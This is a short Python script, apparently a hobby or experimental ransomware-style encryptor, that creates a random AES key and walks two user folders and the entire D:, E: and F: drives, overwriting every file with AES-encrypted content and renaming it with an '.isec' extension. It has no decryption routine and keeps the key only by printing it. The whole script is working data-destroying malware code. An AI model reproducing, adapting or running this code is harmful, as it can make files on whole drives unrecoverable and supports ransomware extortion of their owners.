from typing import Text
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from base64 import b64encode 
import os,string
from random import *
from io import BytesIO


files_encrypted=0

key = ""
characters=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0','-','=','!','%','^','&','*','(',')','|',':','.',',','/','<','>','+','_','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
for x in range(0,31):
    key = key + choice(tuple(characters))
key = key.encode("UTF-8")
print(key)
key = pad(key,AES.block_size)



def encrypted_file(file_name,key):
    with open(file_name,'rb') as entry:
        data = entry.read()
        cipher = AES.new(key,AES.MODE_CFB)
        ciphertext = cipher.encrypt(pad(data,AES.block_size))
        iv = b64encode(cipher.iv).decode("UTF-8")
        ciphertext = b64encode(ciphertext).decode("UTF-8")
        to_write = iv + ciphertext
    with open(file_name ,"w") as data:
        data.write(to_write)
    os.rename(file_name,file_name +".isec")


folder_list=['C:\\Users\\91960\\Desktop\\texts','C:\\Users\\91960\\test2','D:\\','E:\\','F:\\']
for dir in folder_list:
    localdir =dir
    print(dir)
    for subdir, dirs, files in os.walk(localdir):
            for file in files:
                encrypted_file(os.path.join(subdir, file),key)
                files_encrypted += 1
                print(files_encrypted,"is encrypted")
                print((os.path.join(subdir, file)))


